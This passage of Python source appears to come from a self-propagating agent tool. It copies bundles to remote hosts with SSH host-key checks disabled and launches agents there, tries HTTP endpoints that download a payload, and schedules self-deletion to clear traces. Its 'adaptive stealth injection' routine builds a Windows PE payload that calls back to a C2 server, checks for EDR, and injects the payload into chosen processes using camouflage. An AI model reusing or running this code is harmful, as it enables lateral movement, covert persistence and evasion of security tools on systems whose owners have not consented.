            with open(manifest_file, "r", encoding="utf-8") as mf:
                manifest = json.load(mf)
        except Exception as e:
            return False, f"Failed to parse manifest: {e}"

        files_map = manifest.get("files", {})
        for rel_str, expected_hash in files_map.items():
            fpath = bundle_path / Path(rel_str)
            if not fpath.exists():
                return False, f"Missing file: {rel_str}"
            with open(fpath, "rb") as bf:
                actual_hash = hashlib.sha256(bf.read()).hexdigest()
            if actual_hash != expected_hash:
                return False, f"Hash mismatch for {rel_str}"

        if hmac_key:
            expected_sig = manifest.get("hmac_signature")
            computed_sig = hmac.new(
                hmac_key.encode("utf-8"),
                json.dumps(files_map, sort_keys=True).encode("utf-8"),
                hashlib.sha256
            ).hexdigest()
            if not hmac.compare_digest(str(expected_sig), computed_sig):
                return False, "HMAC signature mismatch"

        return True, "Integrity verified"

    # ------------------------------------------------------------------
    def _rsync_bundle(self, host: str, local: Path, remote: str, ssh_port: int = 22) -> bool:
        """Rsync bundle to remote host with SSH port support"""
        cmd = [
            "rsync",
            "-az",
            "--delete",
            "-e",
            f"ssh -i {self.ssh_key} -p {ssh_port} -o StrictHostKeyChecking=no",
            str(local) + "/",
            f"{self.ssh_user}@{host}:{remote}",
        ]
        try:
            log.info("📤 Syncing bundle to %s:%d via rsync...", host, ssh_port)
            result = subprocess.run(cmd, check=True, capture_output=True, timeout=60)
            log.info("✅ Rsync finished to %s:%s", host, remote)
            return True
        except subprocess.CalledProcessError as e:
            log.error("❌ Rsync failed to %s:%d: %s", host, ssh_port, e.stderr.decode('utf-8', errors='ignore')[:200])
            return False
        except subprocess.TimeoutExpired:
            log.error("⏱️  Rsync timeout to %s:%d", host, ssh_port)
            return False
        except Exception as e:
            log.error("❌ Rsync error to %s:%d: %s", host, ssh_port, e)
            return False

    # ------------------------------------------------------------------
    def _spawn(self, host: str, remote_dir: str, ssh_port: int = 22):
        """Spawn remote agent on target with fallback to HTTP if SSH fails"""
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        try:
            log.info("🔐 Connecting to %s:%d via SSH...", host, ssh_port)
            ssh.connect(
                hostname=host,
                username=self.ssh_user,
                key_filename=str(self.ssh_key),
                port=ssh_port,
                timeout=10,
            )

            # Docker socket available? Try Docker first, then Python
            cmd = (
                f"cd {remote_dir} && "
                f"(docker run --rm -d --name br_{uuid.uuid4().hex[:8]} {self.docker_img} || "
                f"python3 run.py &)"
            )
            
            log.info("🚀 Executing spawn command on %s:%d...", host, ssh_port)
            stdin, stdout, stderr = ssh.exec_command(cmd, timeout=15)
            rc = stdout.channel.recv_exit_status()
            
            if rc == 0:
                log.info("✅ Spawned on %s:%d via %s", host, ssh_port, "Docker" if "docker run" in cmd else "Python")
                return True
            else:
                stderr_out = stderr.read().decode('utf-8', errors='ignore')[:200]
                log.error("❌ Spawn failed on %s:%d (rc=%d): %s", host, ssh_port, rc, stderr_out)
                return False

            ssh.close()
        except socket.timeout:
            log.error("⏱️  SSH timeout to %s:%d", host, ssh_port)
            return False
        except ssh_exception.NoValidConnectionsError:
            log.error("❌ SSH connection refused on %s:%d", host, ssh_port)
            return False
        except Exception as e:
            log.error("❌ SSH spawn error on %s:%d: %s", host, ssh_port, type(e).__name__)
            return False

    # ------------------------------------------------------------------
    def _spawn_http_fallback(self, host: str, payload_url: str) -> bool:
        """Fallback HTTP execution if SSH unavailable"""
        try:
            import requests
            
            log.info("🌐 Attempting HTTP fallback to %s...", host)
            
            # Try to download and execute payload via HTTP
            fallback_urls = [
                f"http://{host}:8080/payload/download",
                f"http://{host}:3000/payload/download",
                f"http://{host}:5000/payload/download",
            ]
            
            for url in fallback_urls:
                try:
                    resp = requests.post(url, json={"payload_url": payload_url}, timeout=5)
                    if resp.status_code == 200:
                        log.info("✅ HTTP fallback successful on %s", url)
                        return True
                except:
                    pass
            
            log.warning("⚠️  HTTP fallback failed - no responsive endpoints on %s", host)
            return False
            
        except ImportError:
            log.warning("⚠️  requests not available - HTTP fallback skipped")
            return False
        except Exception as e:
            log.warning("⚠️  HTTP fallback error: %s", e)
            return False

    # ------------------------------------------------------------------
    def _schedule_cleanup(self, host: str, remote_dir: str, ssh_port: int = 22):
        """Remote self-destruct after TTL."""
        cleanup_cmd = f"sleep $(( {self.ttl_minutes} * 60 )) && rm -rf {remote_dir}"
        try:
            subprocess.Popen(
                ["ssh", "-i", str(self.ssh_key), "-p", str(ssh_port), f"{self.ssh_user}@{host}", cleanup_cmd],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            log.info("🧹 Scheduled cleanup on %s in %s min", host, self.ttl_minutes)
        except Exception as e:
            log.warning("⚠️  Failed to schedule cleanup on %s: %s", host, e)

    # ------------------------------------------------------------------
    # Phase 4 REVISED: ADAPTIVE STEALTH CODE INJECTION
    # ------------------------------------------------------------------
    def _inject_payload_post_propagation(self, host: str, target_os: str) -> bool:
        """
        Post-propagation adaptive stealth injection (Phase 4 REVISED)
        
        IMPROVEMENTS:
        1. ✅ Detects EDR presence and adjusts techniques
        2. ✅ Selects legitimate targets (avoids lsass.exe, csrss.exe)
        3. ✅ Applies behavioral camouflage (threads, memory, timing)
        4. ✅ Monitors execution and provides feedback
        5. ✅ Adapts on failure (tries different technique/target)
        
        Flow:
        - Analyze environment for EDR
        - Generate stageless PE payload
        - Select safe target process + technique
        - Apply behavioral camouflage patterns
        - Execute injection with monitoring
        - Report feedback to C2
        
        Args:
            host: Target host (already compromised)
            target_os: OS detected in _propagate
            
        Returns:
            True if injection successful, False otherwise
        """
        
        if target_os != "windows":
            log.info(f"ℹ️  Unix injection deferred (Phase 4.2) - host {host}")
            return False
        
        if not self.adaptive_injection:
            log.warning("⚠️  Adaptive injection engine not initialized")
            log.info("ℹ️  Falling back to visible spawn process (acceptable)")
            return False
        
        try:
            log.info(f"🔐 Phase 4 REVISED: Adaptive stealth injection on {host}")
            
            # Step 1: Analyze environment for EDR
            log.info("📊 Step 1: Analyzing execution environment...")
            edr_analysis = self.adaptive_injection.analyze_and_adapt()
            
            if edr_analysis.threat_level.value == "impossible":
                log.error(f"❌ Environment impossible to inject: {edr_analysis.recommendation}")
                return False
            
            log.info(f"✅ Threat Level: {edr_analysis.threat_level.value}")
            log.info(f"✅ Safe Techniques: {edr_analysis.injection_techniques}")
            
            # Step 2: Generate stageless PE payload with C2 callback
            log.info("📦 Step 2: Generating stageless PE payload...")
            
            if not self.pe_generator:
                log.warning("⚠️  PE generator not available")
                return False
            
            c2_host = self.cfg.get("swarm", {}).get("controller_host", "127.0.0.1")
            c2_port = self.cfg.get("swarm", {}).get("controller_port", 8765)
            
            payload_result = self.pe_generator.create_stageless_payload(
                c2_url=f"http://{c2_host}:{c2_port}/agent/phone-home",
                target_host=host,
                output_path=f"/tmp/payload_{host}.exe"
            )
            
            if not payload_result.success:
                log.error(f"❌ Failed to generate payload: {payload_result.error_message}")
                return False
            
            log.info(f"✅ Generated PE: {payload_result.size_bytes} bytes at {payload_result.pe_path}")
            
            # Step 3: Select safe target and technique
            log.info("🎯 Step 3: Selecting safe target process and technique...")
            target_process, technique, risk_score = self.adaptive_injection.select_target_and_technique(
                edr_analysis
            )
            
            if not target_process or not technique:
                log.error(f"❌ No safe target/technique available")
                return False
            
            if risk_score > 70:
                log.warning(f"⚠️  HIGH RISK ({risk_score}/100) - {edr_analysis.recommendation}")
            
            # Step 4: Prepare injection with behavioral camouflage
            log.info("🎭 Step 4: Applying behavioral camouflage...")
            injection_plan = self.adaptive_injection.prepare_injection(target_process, technique)
            
            log.info(f"✅ Camouflage Plan:")
            log.info(f"   Parent Process: {injection_plan['parent_process']}")
            log.info(f"   Thread Pattern: {injection_plan['thread_pattern']['expected_thread_count']} threads")
            log.info(f"   C2 Frequency: {injection_plan['c2_pattern']['frequency']}")
            
            # Step 5: Execute injection with adaptive retry
            log.info("💉 Step 5: Executing adaptive injection...")
            injection_id = self.adaptive_injection.execute_injection(
                payload_result.pe_path,
                injection_plan,
                retry_count=0,
                max_retries=2
            )
            
            if injection_id:
                log.info(f"✅ Injection successful: {injection_id}")
                log.info(f"   Target: {target_process}")
                log.info(f"   Technique: {technique}")
                log.info(f"   Payload now executing invisibly in process memory")
                
                # Step 6: Report to C2
                summary = self.adaptive_injection.get_injection_summary()
                log.info(f"📊 Injection Summary: {summary['successful']} successful, "
                        f"{summary['failed']} failed, {summary['edr_detected']} EDR-blocked")
                
                return True
            
            else:
                log.warning(f"⚠️  Adaptive injection failed after retries")
                log.info(f"ℹ️  Payload will remain in spawn process (acceptable fallback)")
                return False
        
        except Exception as e:
            log.error(f"❌ Adaptive injection exception: {e}")
            import traceback
            traceback.print_exc()
            return False


# ------------------------------------------------------------------
if __name__ == "__main__":
    PropagationAgent().run()